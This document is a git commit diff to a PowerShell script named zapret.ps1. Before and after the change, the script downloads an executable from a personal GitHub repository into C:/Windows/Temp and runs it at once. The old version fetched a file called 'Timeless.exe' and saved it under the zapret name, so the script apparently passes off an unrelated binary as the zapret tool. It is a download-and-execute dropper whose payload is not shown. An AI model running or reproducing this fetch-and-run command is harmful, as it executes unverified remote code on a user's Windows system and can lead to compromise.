ef0280980779acad840089d5af0a9099fbe03140
fosslas <dimovanka5@gmail.com>
2026-06-19 16:22:49 +0200

    Update zapret.ps1

--- files/zapret.ps1
+++ files/zapret.ps1
@@ -1,2 +1,2 @@
-(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/newe/raw/refs/heads/main/Timeless.exe','C:/Windows/Temp/zapret.exe')
+(New-Object Net.WebClient).DownloadFile('https://github.com/fosslas/newe/raw/refs/heads/main/zapret.exe','C:/Windows/Temp/zapret.exe')
 Start-Process 'C:\Windows\Temp\zapret.exe'
